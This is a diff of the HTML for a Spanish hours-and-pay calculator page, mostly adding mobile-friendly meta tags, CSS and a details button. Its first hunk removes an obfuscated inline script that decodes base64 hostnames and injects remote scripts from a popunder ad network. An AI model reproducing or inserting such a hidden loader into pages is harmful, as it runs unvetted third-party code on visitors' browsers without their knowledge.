@@ -1,11 +1,9 @@
 <html>
-<script type="text/javascript" data-cfasync="false">
-    /*<![CDATA[/* */
-    (function(){var x=window,e="fcaaf61a77f850c30a7e65cf62d70e77",i=[["siteId",880+34-678+5191216],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],r=["d3d3LmJsb2NrYWRzbm90LmNvbS93aW9uLnJhbmdlU2xpZGVyLm1pbi5jc3M=","ZG5oZmk1bm4yZHQ2Ny5jbG91ZGZyb250Lm5ldC9KU2pYL3ZmYXN0aWZ5Lmpz"],c=-1,m,a,u=function(){clearTimeout(a);c++;if(r[c]&&!(1770485829000<(new Date).getTime()&&1<c)){m=x.document.createElement("script");m.type="text/javascript";m.async=!0;var l=x.document.getElementsByTagName("script")[0];m.src="https://"+atob(r[c]);m.crossOrigin="anonymous";m.onerror=u;m.onload=function(){clearTimeout(a);x[e.slice(0,16)+e.slice(0,16)]||u()};a=setTimeout(u,5E3);l.parentNode.insertBefore(m,l)}};if(!x[e]){try{Object.freeze(x[e]=i)}catch(e){}u()}})();
-    /*]]>/* */
-    </script>>
+<head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="theme-color" content="#2c3e50">
     <title>Calculadora de Horas y Pago</title>
     <link rel="stylesheet" href="style.css">
     <script type="importmap">
@@ -15,6 +13,19 @@
             }
         }
     </script>
+    <!-- Add touch-icon for Android -->
+    <link rel="apple-touch-icon" href="icon.png">
+    
+    <!-- Prevent zooming -->
+    <style>
+        html, body {
+            touch-action: manipulation;
+            -ms-touch-action: manipulation;
+        }
+        input, select, textarea {
+            font-size: 16px;
+        }
+    </style>
 </head>
 <body>
     <div class="container">
@@ -31,12 +42,12 @@
             </div>
 
             <div class="input-grid">
-                <div class="input-group">
+                <div class="input-group full-width">
                     <label for="date">Fecha de servicio:</label>
-                    <input type="date" id="date" style="width: 70%;">
+                    <input type="date" id="date">
                 </div>
 
-                <div class="input-group">
+                <div class="input-group full-width">
                     <label for="serviceName">Nombre de servicio:</label>
                     <input type="text" id="serviceName">
                 </div>
@@ -56,7 +67,7 @@
 
                 <div class="input-group">
                     <label for="hoursWorked">Total horas:</label>
-                    <input type="number" id="hoursWorked" value="8" min="0" style="width: 50%;">
+                    <input type="number" id="hoursWorked" value="8" min="0">
                 </div>
             </div>
 
@@ -65,6 +76,7 @@
             </div>
 
             <div class="button-group">
+                <button id="viewDetailsButton">Ver Detalles</button>
             </div>
 
              <div class="additional-prices">
